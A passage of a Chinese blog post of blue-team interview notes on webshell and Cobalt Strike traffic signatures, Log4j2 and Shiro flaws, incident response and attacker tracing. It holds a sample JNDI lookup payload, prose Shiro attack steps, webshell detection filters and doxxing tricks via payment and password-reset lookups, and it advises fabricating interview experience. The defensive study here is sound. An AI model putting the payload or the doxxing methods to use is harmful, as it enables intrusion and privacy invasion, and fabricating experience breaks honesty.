AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3 SE 2.X MetaSr 1.0</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 QQBrowser/6.9.11079.201</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser/6.9.11079.201</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</span><br></pre></td></tr></table></figure><h2 id="菜刀流量特征"><a href="#菜刀流量特征" class="headerlink" title="菜刀流量特征"></a>菜刀流量特征</h2><p>(最开始是明文传输，后来采用base64加密)：PHP类WebShell连接流量</p><ul><li>菜刀 webshell 只使用了 url 编码 + base64 编码，所以会有(base64_decode($_POST[z0]))，(base64_decode($_POST[z0]))将攻击payload进行Base64解码，注意观察<strong>base64_decode字段</strong></li><li>shell 特征就是传输参数名为 z0(&amp;z0&#x3D;QGluaV9zZXQ)</li></ul><blockquote><p>该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文。</p></blockquote><ul><li>2016 后的版本做了加密和混淆，有些关键函数还是没有被加密的，比如 ini_set，eval，assert等。</li><li>菜刀的$_POST 也可能会被$_GET 和$_REQUEST 替代</li></ul><h2 id="蚁剑流量特征"><a href="#蚁剑流量特征" class="headerlink" title="蚁剑流量特征"></a>蚁剑流量特征</h2><ul><li>蚁剑对流量有<strong>base64加密</strong>，但是有些关键代码是没有被加密的，比如：PHP 中的 ini_set；ASP 中的 OnError,response。</li><li>流量最中<strong>明显的特征</strong>为@ini_set(“display_errors”,”0”);这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码</li><li>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“<em>0x…..&#x3D;”这种形式（下划线可替换为其他）所以，以</em><strong>0x开头的参数名</strong>，后面为加密数据的数据包也可识别为蚁剑的流量特征。</li><li>会带有base64编码解码等字符特征</li></ul><h2 id="哥斯拉流量特征（base64加密）"><a href="#哥斯拉流量特征（base64加密）" class="headerlink" title="哥斯拉流量特征（base64加密）"></a>哥斯拉流量特征（base64加密）</h2><p>哥斯拉的流量隐藏就做得很好了，据说能绕过市面上基本所有的静态查杀。</p><blockquote><ul><li>所有请求中Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li><li>所有响应中Cache-Control: no-store, no-cache, must-revalidate,</li></ul><p>以上两个只能作为弱特征参考</p><ul><li>同时在所有请求中Cookie中后面都存在<strong>；</strong>特征</li><li>与php请求一样都含有”pass&#x3D;”而且发起连接时服务器返回的Content-Length是0</li></ul></blockquote><blockquote><p><a href="https://blog.csdn.net/weixin_46684578/article/details/122148960">哥斯拉流量特征已经检测思路</a></p></blockquote><h2 id="cobalt-strick流量特征"><a href="#cobalt-strick流量特征" class="headerlink" title="cobalt strick流量特征"></a>cobalt strick流量特征</h2><p>cs 的流量特征有很多，比如说一些可以变更端口，<strong>默认证书-指纹信息（ssl.store）</strong>。还有一些比如说 <strong>shell whoami，hashdump，screenshot 没有被加密</strong>。CS 还有<strong>心跳包</strong>，有分析平台的话可以批量分析流量数据，或者批量导出然后用 excle 做一下透视</p><p>数据包的话可以观察 certificate 数据包，也可以看看连接节点时发送的 client hello 数据包。</p><p>还有一些可以作为辅助判断的，比如 Beacon Staging，也可以看看ja3 的值，cs 使用的是 ja3 的算法。</p><blockquote><p>(不怎么懂）太菜了</p></blockquote><h2 id="AWVS流量特征"><a href="#AWVS流量特征" class="headerlink" title="AWVS流量特征"></a>AWVS流量特征</h2><p>在护网中，通过Fofa检索title&#x3D;&#x3D;”Acunetix”可以看到有659个IP部署了AWVS，如果企业未在互联侧部署有AWVS，则可以将以上IP作为重点监控对象。使用AWVS扫描器对企业资产进行扫描时，HTTP请求包和响应包中都存在有特征。</p><p>（1）Accept:acunetix&#x2F;wvs</p><p>（2）HTTP请求头存在Acunetix-*的自定义字段</p><p>（3）HTTP请求包或者响应包中包含hit*.<a href="https://link.zhihu.com/?target=http://bxss.me">http://bxss.me</a></p><p>AWVS在进行无回显漏洞探测时候会使用到DNSLog（<a href="https://link.zhihu.com/?target=http://bxss.me">http://bxss.me</a>），DNSLog生成规则为”<a href="https://link.zhihu.com/?target=http://hit">http://hit</a>“ + rndToken + ‘.<a href="https://link.zhihu.com/?target=http://bxss.me/">http://bxss.me/</a>‘ 随机的三级域名作为payload。</p><h1 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h1><h2 id="Log4j2远程代码执行漏洞"><a href="#Log4j2远程代码执行漏洞" class="headerlink" title="Log4j2远程代码执行漏洞"></a>Log4j2远程代码执行漏洞</h2><blockquote><p><a href="https://11pmsleep.github.io/2022-09-22-WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x15-Apache%20Log4j2%E6%BC%8F%E6%B4%9E/">0x15 - Apache Log4j2 漏洞</a></p></blockquote><h3 id="漏洞概要-："><a href="#漏洞概要-：" class="headerlink" title="漏洞概要 ："></a><strong>漏洞概要 ：</strong></h3><p>Apache Log4j是一个基于Java的日志记录组件。</p><p>log4j2可以使用简单表达式记录动态内容,也就是可以传入变量，也就是<code>$&#123;&#125;</code></p><p>简单表达式使用 ${} 进行包裹变量，在 ${} 后面可以使用一些解析器，解析动态内容，打印出来解析的结果（本来我们看不到日志内容，但是可以通过dnslog带出执行结果）</p><p><strong>在这个${}里面存在着JNDI注入</strong></p><p><code>$&#123;&#125;</code>解析变量有多种方式多种解析器，log4j2漏洞便是因为jndi解析器。</p><p>主要是JNDI其中有一个lookup()方法，这是一个查找方法，log4j2在获取到${}这样的格式的时候会自动的去调用lookup()方法。</p><p>这个方法的可怕之处就在于，<strong>如果lookup方法的参数是一个url地址时，那么客户端就会去lookup()方法参数指定的url中加载远程对象</strong>。比如<code>lookup(&quot;rmi://127.0.0.1/test&quot;)</code></p><p>回过头来，jndi 解析器可以获取远程 jndi 对象。jdk中提供了多种不同 jndi 对象的获取方式，获取方式可以称为schema，注入rmi，ldap，dns</p><p>我们使用jndi利用ldap或者rmi的方式加载远程恶意类并执行即可达到我们getshell的目的</p><h3 id="log4j2流量特征"><a href="#log4j2流量特征" class="headerlink" title="log4j2流量特征"></a>log4j2流量特征</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">很显然，利用jndi，多多少少有下面字样</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://tjxy78.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><h2 id="shiro漏洞"><a href="#shiro漏洞" class="headerlink" title="shiro漏洞"></a>shiro漏洞</h2><blockquote><p>apache的一个权限管理的开源框架,实现 用户认证、用户授权。</p></blockquote><blockquote><p>框架特征：cookie字段为存在rememberMe&#x3D;xxxxx;</p></blockquote><h3 id="550"><a href="#550" class="headerlink" title="550"></a>550</h3><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后用 户信息会经过加密编码后存储在cookie中。在 Cookie 读取过程中有用 AES 对Cookie 值解密的过程，对于 AES 这类对称加密算法，一旦秘钥泄露加密便形同虚设。若秘钥可控，同时Cookie 值是由攻击者构造的恶意 Payload，就可以将流程走通，触发危险的 Java 反序列化，从而导致远程命令执行漏洞。</p><blockquote><p><a href="https://blog.csdn.net/qq_28205153/article/details/55798628">AES加密算法的详细介绍与实现</a></p></blockquote><h3 id="721"><a href="#721" class="headerlink" title="721"></a>721</h3><p>原理：由于Apache Shiro中通过 AES-128-CBC 模式加密的rememberMe字段存 在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行</p><p><strong>用通俗易懂的话来说就是</strong></p><p>shiro721用到的加密方式是AES-CBC，而且其中的ase加密的key基本猜不到了，是系统随机生成的。而cookie解析过程跟cookie的解析过程一样，也就意味着如果能伪造恶意的rememberMe字段的值且目标含有可利用的攻击链的话，还是能够进行RCE的x&#96;</p><p>复现步骤：</p><ol><li>输入正确的用户名和密码登录网站（勾选Remember），并从cookie中获取RememberMe值。</li><li>使用RememberMe cookie作为Padding Oracle Attack的前缀。</li><li>加密ysoserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。</li><li>请求带有新的RememberMe cookie的网站，以执行反序列化攻击。</li><li>攻击者无需知道RememberMe加密的密码密钥。</li></ol><p>Apache Shiro RememberMe Cookie默认通过AES-128-CBC模式加密，这种加密方式容易受到Padding Oracle Attack（Oracle填充攻击），利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击。</p><h3 id="shiro流量特征"><a href="#shiro流量特征" class="headerlink" title="shiro流量特征"></a>shiro流量特征</h3><ol><li>你要怎么通过流量分析知道对方使用的 shiro 攻击是否成功呢？</li></ol><p>比如说我们可以看看出网流量，有没有发送 shell 的情况，因为shiro 利用一般都会弹 shell。其次，我们可以通过 ids 等设备，如果发现数据包 header 的数据特别长，cookie 特别长的情况可能就是有人在用 shiro 反序列化了，因为这个漏洞的利用是在 cookie 传入指令</p><h1 id="owasp-top-10"><a href="#owasp-top-10" class="headerlink" title="owasp top 10"></a>owasp top 10</h1><h1 id="监控组"><a href="#监控组" class="headerlink" title="监控组"></a>监控组</h1><h3 id="和甲方上报-IP-地址，你要上报哪些地址呢？"><a href="#和甲方上报-IP-地址，你要上报哪些地址呢？" class="headerlink" title="和甲方上报 IP 地址，你要上报哪些地址呢？"></a>和甲方上报 IP 地址，你要上报哪些地址呢？</h3><p>上报攻击 ip 的地址，先判断是内网 ip 还是公网 ip，如果是内网ip，查看是否是业务白名单行为，若不是再上报进行判断。若是公网 ip，查看是否在白名单内，若不是查看是否是扫描器 ip，若是扫描器 ip，扫描对业务或者对研判产生了影响则可以上报，若不是且判断出是真实攻击 ip 也进行上报。</p><h3 id="如果看到一个告警ip，如何判断是否是真实攻击？"><a href="#如果看到一个告警ip，如何判断是否是真实攻击？" class="headerlink" title="如果看到一个告警ip，如何判断是否是真实攻击？"></a>如果看到一个告警ip，如何判断是否是真实攻击？</h3><blockquote><ul><li>排查告警IP的逻辑</li></ul><p>首先，我会先判断一下ip来源，判断是内网ip还是公网ip</p><p>若为<strong>内网ip</strong></p><blockquote><ul><li>然后对请求包的内容是否存在<strong>恶意payload</strong>，然后再根据响应包内容有执行成功的回显，若相应包中有对应的payload的回显，则可以判断为攻击成功，</li><li>但是此时，需要判断下是否为<strong>业务系统的逻辑</strong>造成的和是否是工作人员在<strong>测试业务系统漏洞</strong>，若工作人员证实了该告警为自家安全ip，则认为该攻击为误报，若非自家ip且不存在逻辑因素，则可判断为内网攻陷。</li></ul></blockquote><p>若为<strong>公网ip</strong></p><blockquote><ul><li>通过流量特征判断，如特征里面含有漏洞利用的 <strong>payload</strong>，或者恶意payload利用成功，则可判断为真实攻击。</li><li>对于公网IP也可以通过<strong>威胁情报网站</strong>，对攻击 ip 进行搜索，如果攻击 ip 被标记为恶意 ip，大概率为恶意攻击</li></ul></blockquote><ul><li>可以对请求包进行<strong>重放来判断</strong>，在自己的机器上重放流量包，将 payload 改成自己的 payload 来判断是否攻击成功</li><li>此外，从大体上可以通过<strong>返回包判断攻击是否成功</strong>，比如命令执行攻击有回显的话返回包就会有命令执行的结果。</li><li>如果有一些<strong>安全设备</strong>的话也可以通过查看告警信息判断。</li></ul></blockquote><h3 id="如何判断是扫描器还是红队的攻击"><a href="#如何判断是扫描器还是红队的攻击" class="headerlink" title="如何判断是扫描器还是红队的攻击"></a>如何判断是扫描器还是红队的攻击</h3><blockquote><ul><li>扫描器一般都是短时间，大量重复的攻击，且攻击 payload 都极为相似，可以通过搜索历史 ip 日志判断，而且扫描器的 payload 一般比较杂乱。大部分请求包对应的返回包都是一样的。</li><li>红队攻击一般流量比较少，且 payload 比较简练，不同请求对应的返回包会有变化。</li></ul></blockquote><h3 id="海量的上报怎么判断"><a href="#海量的上报怎么判断" class="headerlink" title="海量的上报怎么判断"></a>海量的上报怎么判断</h3><blockquote><ul><li>有<strong>分析平台的话可以批量分析流量数据</strong>，或者批量导出然后用 excle做一下透视。</li><li>借助分析设备批量分析，查看是否有<strong>同 IP</strong> 有多个攻击行为的。</li><li>首先把<strong>无效的 c 段直接过滤</strong>之后，再去研判</li><li>对于常见的误报，很容易进行识别，主要是<strong>针对于不常见的误报要进行研判</strong>，提取出流量包进行审计，对于某些特殊的 payload 进行复现</li></ul></blockquote><h3 id="如何确定是否是误报？"><a href="#如何确定是否是误报？" class="headerlink" title="如何确定是否是误报？"></a>如何确定是否是误报？</h3><blockquote><ul><li>利用安全设备，分析近期设备告警将全部流量日志（日志条件：源地址，目的地址，端口，事件名称，时间，规则 ID，发生 次数等）根据研判标准进行筛选，一般情况下，真实攻击不可能只持续一次，它一定是长时间、周期性、多 IP 的进行攻击。<strong>所以我们可以将时间线拉长，看看类似的请求或者数据包在之前很长一段时间有无重复出现。</strong></li><li>如果<strong>不是特别有规律的参数</strong>，如md5这类，一般是业务误报。</li><li>观察<strong>包的内容</strong>，对请求数据包和返回数据包分析判断其是否为误报。如果是一些类似于文件操作或者命令执行的参数，很有可能就是攻击数据包。</li><li>结合<strong>流量日志IP</strong>，配合微步、奇安信威胁情报中心、<strong>绿盟威胁情报云等威胁情报库，对IP进行分析，是不是恶意攻击</strong></li><li>对包内容分析后实在<strong>不确定就去问客户</strong>。是不是正常的业务请求,或者是业务漏洞</li><li>如果是内网恶意攻击的话，不一定是内网沦陷，进行下一步操作，在<strong>资产梳理表格</strong>中查找 IP 是否为客户内网部署的设备，</li></ul></blockquote><h3 id="CS外连，怎么办？"><a href="#CS外连，怎么办？" class="headerlink" title="CS外连，怎么办？"></a>CS外连，怎么办？</h3><p>观察响应包是只出现一次还是持续性，若有危险直接封禁</p><h1 id="研判组"><a href="#研判组" class="headerlink" title="研判组"></a>研判组</h1><p>研判工作要充分<strong>利用已有安全设备</strong>（需要提前了解客户的网络拓扑以及部署设备情况），分析其近期的设备告警，<strong>将全部流量日志</strong>（日志条件：源地址，目的地址，端口，事件名称，时间，规则 ID，发生 次数等）<strong>根据研判标准进行筛选</strong>（像挖矿、蠕虫、病毒、拒绝服务这类不太可能为攻击方发起的攻击的事件，直接过滤掉，减少告警数量），一般情况下，真实攻击不可能只持续一次，它一定是<strong>长时间、周期性、多 IP 的进行攻击</strong></p><p>对于告警结合<strong>威胁情报库</strong>如：微步、奇安信威胁情报中心、<strong>绿盟威胁情报云</strong>等对于流量日志的原 IP 地址进行分析，判断其是否为恶意攻击，推荐使用微步的插件，如果确认为攻击行为或者不能确认是否为攻击行为，进行下一步操作，在之前准备好的表格中查找 IP 是否为<strong>客户内网部署的设备</strong>，如果不是，继续进行下一步，在事件上报平台查看<strong>是否有其他人提交过</strong>，如果没有，则上报</p><p>然后根据流量日志，对请求<strong>数据包和返回数据包分析</strong>判断其是否为误报，需要留意 <strong>X-Forwarded-For（简称XFF）和 x-real-ip</strong> 可以了解些 webshell 工具的<strong>流量特征</strong>，尤其是免杀 webshell，有可能不会被设备识别</p><p>最后上报事件时，尽可能提供完整的截图，包括源 ip、目的ip，请求包请求体，响应包响应体等重要信息，以方便后续人员研判溯源</p><p><strong>注：不要任意忽略内网告警，适当情况下可以往前推排查时间</strong></p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><blockquote><p>准备，检测，遏制，根除，恢复，跟踪</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">准备已经编译好的⼯具以及取证分析等⼯具⼲净可靠放 U 盘</span><br><span class="line">初步判断事件的类型 是被⼊侵 ddos 还是其它的原因，以及事件等级。</span><br><span class="line">⾸先抑制范围、影响范围，隔离使受害⾯不继续扩⼤。</span><br><span class="line">寻找原因，封堵攻击源。</span><br><span class="line">把业务恢复⾄正常⽔平</span><br><span class="line">监控有⽆异常，报告、管理环节的⾃省和改进措施。</span><br></pre></td></tr></table></figure><h3 id="你有过应急响应的经验吗？"><a href="#你有过应急响应的经验吗？" class="headerlink" title="你有过应急响应的经验吗？"></a>你有过应急响应的经验吗？</h3><blockquote><p>可以尝试编。</p><p>在学校服务器机房学习时，机器疑似被入侵者入侵，登录机器通过查看进程（ps -ef 和top 命令），发现陌生进程。机房运维人员通过查看日志找到攻击者的信息。协助进行入侵排查，是否存在ssh 密钥，计划任务，启动项等可能留后门的行为，查找并删除木马以及在运维人员同意下更改用户密码及时报备。</p></blockquote><h3 id="linux入侵排查（详细的见思维导图）此处只是一个简略的书写"><a href="#linux入侵排查（详细的见思维导图）此处只是一个简略的书写" class="headerlink" title="linux入侵排查（详细的见思维导图）此处只是一个简略的书写~"></a>linux入侵排查（详细的见思维导图）此处只是一个简略的书写~</h3><blockquote><p>文档链接: <a href="https://www.mubucm.com/doc/8aGBgK_MVg">https://www.mubucm.com/doc/8aGBgK_MVg</a> </p></blockquote><blockquote><ul><li>先查看&#x2F;etc&#x2F;passwd是否有新建用户</li><li>查看&#x2F;var&#x2F;log&#x2F;wtmp下的登录日志查看是否有登录痕迹</li><li>若有，查看用户家目录下的bash_history，是否有遗留的命令。</li><li>ps -ef查看是否有木马进程，netstat命令查看是否有正在通信的陌生ip，以及是否新开了对外端口</li><li>查看服务日志，判断入侵者是怎么入侵进来的。</li><li>查看文件修改时间，判断是否有文件被修改。</li><li>查看计划任务以及ssh公钥文件，是否有遗留后门。</li><li>将系统所有可登录用户密码进行更改</li></ul></blockquote><h3 id="服务器存在webshell，如何处理？"><a href="#服务器存在webshell，如何处理？" class="headerlink" title="服务器存在webshell，如何处理？"></a>服务器存在webshell，如何处理？</h3><p>网站被植入 webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入 webshell 接管网站的控制权</p><blockquote><ol><li>及时隔离主机</li><li>定位事件范围，查看文件 webshell 文件的创建时间，对 webshell 取证样本</li><li>通过创建时间结合日志分析可疑行为，以及启动用户的其他进程确定漏洞</li><li>清除 webshell 及残留文件，修复漏洞，进行<strong>入侵排查</strong></li></ol></blockquote><h3 id="cs-进入内网后如何应急"><a href="#cs-进入内网后如何应急" class="headerlink" title="cs 进入内网后如何应急"></a>cs 进入内网后如何应急</h3><blockquote><p>首先自然是看看在线用户，有未授权用户就踢掉</p></blockquote><h3 id="怎么检测、查杀webshell，怎么检测webshell"><a href="#怎么检测、查杀webshell，怎么检测webshell" class="headerlink" title="怎么检测、查杀webshell，怎么检测webshell"></a>怎么检测、查杀webshell，怎么检测webshell</h3><p><strong>主机层面</strong></p><blockquote><ol><li>静态：静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell。</li></ol><ul><li>通过一些查杀工具对比特征值，如D盾、安全狗进行全盘扫描</li><li>对比历史文件夹，查看是否有新增可疑文件,近期修改的文件</li></ul><ol start="2"><li>动态</li></ol><p>通过日志，流量，文件访问频率、访问记录等方法查看文件找到webshell进行检测</p><p>webshell 传到服务器了，在执行函数时这些对于系统调用、系统配置、数据库、文件的操作动作都是可以作为判断依据</p><ol start="3"><li>日志检测</li></ol><p>使用 webshell 一般不会在系统日志中留下记录，但是会在网站的 web 日志中留下 webshell 页面的访问数据和数据提交记录</p><ol start="4"><li>语法检测</li></ol><p>语法语义分析形式，是根据 php 语言扫描编译的实现方式，进行剥离代码、注释，分析变量、函数、字符串、语言结构的分析方式，来实现关键危险函数的捕捉方式这样可以完美解决漏报的情况但误报上</p></blockquote><p><strong>流量层面</strong></p><blockquote><p>webshell流量特征</p></blockquote><h3 id="一台主机在内网进行横向攻击，你应该怎么做"><a href="#一台主机在内网进行横向攻击，你应该怎么做" class="headerlink" title="一台主机在内网进行横向攻击，你应该怎么做"></a>一台主机在内网进行横向攻击，你应该怎么做</h3><blockquote><p>确定攻击来源，是不是员工内部误操作，比如询问运维是否有自动化轮训脚本，判断是否为真实攻击</p><p>如果没有，确定是攻击，结合时间点，根据设备信息，看一下安全事件，进程，流量，端口，启动项，定时任务等等</p><p>找到问题主机，开始应急响应流程：准备，检测，遏制，根除，恢复，跟踪，具体的操作要交给现场运维去处理。</p></blockquote><h3 id="红队删除了历史记录怎么搞"><a href="#红队删除了历史记录怎么搞" class="headerlink" title="红队删除了历史记录怎么搞"></a>红队删除了历史记录怎么搞</h3><blockquote><ul><li>有 history 恢复工具。刚删除的话，内存打快照可以分析。硬盘还没覆盖可以恢复。</li><li>使用安全设别，分析平台，溯源设备等。一般溯源设备都能展示完整的攻击链了。入网流量也可以看到攻击者的动作，包括一些中间件的日志等，比如 iis，nginx 这些都是有日志的。</li></ul></blockquote><h1 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h1><blockquote><ul><li><a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/260888">域前置溯源方法思考</a></li></ul></blockquote><h2 id="你会用什么办法溯源攻击方的个人信息呢"><a href="#你会用什么办法溯源攻击方的个人信息呢" class="headerlink" title="你会用什么办法溯源攻击方的个人信息呢"></a>你会用什么办法溯源攻击方的个人信息呢</h2><blockquote><p>1.首先通过日志和蜜罐等方式获取到攻击方的 ip，可以对 ip 进行反向渗透获取信息，定位攻击者信息。</p><p>2.也可以通过搜索引擎或者安全情报，获取 ip 对应攻击者的网名id，再通过社交平台获取攻击者的信息</p><p>3.通过攻击 IP 历史解析记录&#x2F;域名，对域名注册信息进行溯源分析</p><p>4.如果攻击者有种植木马等，可以提取样本特征如用户名、ID、邮箱、C2 服务器等信息—同源分析</p><p>5.搭载 jsonp 钓鱼的蜜罐，通过 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等</p></blockquote><h2 id="溯源基本步骤"><a href="#溯源基本步骤" class="headerlink" title="溯源基本步骤"></a>溯源基本步骤</h2><ol><li>攻击源捕获</li></ol><blockquote><ul><li>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等</li><li>日志与流量分析，异常的通讯流量、攻击源与攻击目标等</li><li>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等</li><li>邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等</li><li>蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息</li></ul></blockquote><ol start="2"><li>溯源反制手段</li></ol><blockquote><ul><li><strong>IP 定位技术</strong> 根据IP定位物理地址–代理 IP 溯源案例：通过 IP 端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息</li><li><strong>ID 追踪术 ID 追踪术</strong>，搜索引擎、社交平台、技术论坛、社工库匹配 溯源案例：利用 ID 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</li><li><strong>网站 url 域名</strong> Whois 查询–注册人姓名、地址、电话和邮箱 –域名隐私保护 溯源案例：通过攻击 IP 历史解析记录&#x2F;域名，对域名注册信息进行溯源分析</li><li><strong>恶意样本分析</strong> 提取样本特征、用户名、ID、邮箱、C2 服务器等信息–同源分析 溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者</li><li><strong>社交账号</strong> 基于 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等 利用条件：可以找到相关社交网站的 jsonp 接口泄露敏感信息，相关网站登录未注销</li></ul></blockquote><ol start="3"><li>攻击者画像</li></ol><blockquote><ul><li>攻击路径</li></ul><p>攻击目的：拿到权限、窃取数据、获取利益、DDOS 等 网络代理：代理 IP、跳板机、C2 服务器等 攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等</p><ul><li>攻击者身份画像</li></ul><p>虚拟身份：ID、昵称、网名 真实身份：姓名、物理位置 联系方式：手机号、qq&#x2F;微信、邮箱 组织情况：单位名称、职位信息</p></blockquote><h2 id="溯源技巧"><a href="#溯源技巧" class="headerlink" title="溯源技巧"></a>溯源技巧</h2><blockquote><ol><li>域名、ip 反查目标个人信息</li><li>支付宝转账，确定目标姓氏</li><li>淘宝找回密码，确定目标名字</li><li>企业微信手机号查公司名称</li><li>REG007 查注册应用、网站</li><li>程序 PDB 信息泄露</li></ol></blockquote><h2 id="主动防御"><a href="#主动防御" class="headerlink" title="主动防御"></a>主动防御</h2><blockquote><p><a href="https://www.freebuf.com/articles/web/245585.html">基于网络欺骗与浏览器指纹的WEB攻击溯源</a></p></blockquote><ol><li><p>浏览器指纹技术</p><blockquote><p>在浏览器与网站服务器交互时，浏览器会向网站暴露许多的不同消息，比如浏览器型号、浏览器版本、操作系统等信息。如同人的指纹可以用来识别不同的人一样，当浏览器暴露信息的熵足够高时，网站就可利用这些信息来识别、追踪和定位用户。</p></blockquote></li><li><p>网络欺骗技术，蜜罐蜜网</p><blockquote><p>网络欺骗是一种针对网络攻击的防御手段（或策略），目的是让攻击者相信目标系统存在有价值的、可利用的安全弱点（伪造或不重要的），从而将攻击者引向这些错误的资源，以达到检测攻击、阻碍攻击、记录攻击行为的目的。其中，蜜罐是我们常见的一种网络欺骗技术，除了蜜罐技术，还存在蜜饵、蜜网、虚拟网络拓扑等多种欺骗技术实现方式。</p></blockquote></li></ol><h2 id="如何通过流量溯源，定位IP"><a href="#如何通过流量溯源，定位IP" class="headerlink" title="如何通过流量溯源，定位IP"></a>如何通过流量溯源，定位IP</h2><p>可利用流量工具 wireshark 进行溯源：</p><blockquote><ol><li>查看 eval、 z0、 shell whoami 等关键字，查看出现次数过多的时候， 需要查看是哪个页面发起的请求，有可能是 webshell</li><li>通过 WireShark 工具快速搜索关键字，定位到异常流量包</li><li>找出异常 IP 和所上传的内容，查看是否为 webshell</li></ol></blockquote><p>如何定位到攻击IP：</p><blockquote><ol><li>首先通过选择 - 统计 - 对话查看流量的走向情况， 定位可疑的 IP 地址</li><li>根据定位到的 IP 地址，尝试对上传的 webshell 进行定位</li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash ip.addr == ip &amp;&amp; http matches &quot;uploadllevallselectlxp_cmdshell&quot; &amp;&amp; http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure><p>查找到 webshell 后尝试溯源漏洞位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash http.request.uri contains &quot;webshell.php&quot;</span><br></pre></td></tr></table></figure><p>定位到最开始 webshell 执行或上传的时候</p><p>根据最开始的 HTTP 上传包或者其他漏洞特征定位漏洞类型</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><blockquote><p>wireshark 简单的过滤规则</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">过滤ip：</span></span><br><span class="line">过滤源 ip 地址：ip.src1.1.1.1</span><br><span class="line">目的 ip 地址：ip.dst1.1.1.1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">过滤端口：</span></span><br><span class="line">过滤80端口：tcp.port == 80</span><br><span class="line">源端口：tcp.srcport == 80</span><br><span class="line">目的端：tcp.dstport == 80</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">协议过滤：直接输入协议名即可，如 http 协议 http</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">http 模式过滤：过滤 get/post 包 httprequest.mothod == <span class="string">&quot;GET/POST&quot;</span></span></span><br></pre></td></tr></table></figure><h2 id="常用取证工具"><a href="#常用取证工具" class="headerlink" title="常用取证工具"></a>常用取证工具</h2><p>Wireshark、xplico、 Volatility、 FastlR Collector、Autopsy、 Dumplt、 FTK Imager、Foremost、Scalpel、 Bulk_ exetractor 等</p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="windows日志和Linux日志在哪-x2F-日志位置："><a href="#windows日志和Linux日志在哪-x2F-日志位置：" class="headerlink" title="windows日志和Linux日志在哪&#x2F;日志位置："></a>windows日志和Linux日志在哪&#x2F;日志位置：</h3><p>linux:一般来说linux的系统日志都放在&#x2F;var&#x2F;log目录下面 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一</span><br><span class="line">/var/log/secure 与安全相关的日志信息</span><br><span class="line">/var/log/maillog 与邮件相关的日志信息</span><br><span class="line">/var/log/cron 与定时任务相关的日志信息</span><br><span class="line">/var/log/spooler 与UUCP和news设备相关的日志信息</span><br><span class="line">/var/log/boot.log 守护进程启动和停止相关的日志消息</span><br><span class="line">/var/log/wtmp （linux登录日志）该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件</span><br><span class="line">/var/log/syslog：它和/etc/log/messages日志文件不同，它只记录警告信息，常常是系统出问题的信息。</span><br><span class="line">/var/log/user.log：记录所有等级用户信息的日志。</span><br><span class="line">/var/log/auth.log：包含系统授权信息，包括用户登录和使用的权限机制等。</span><br><span 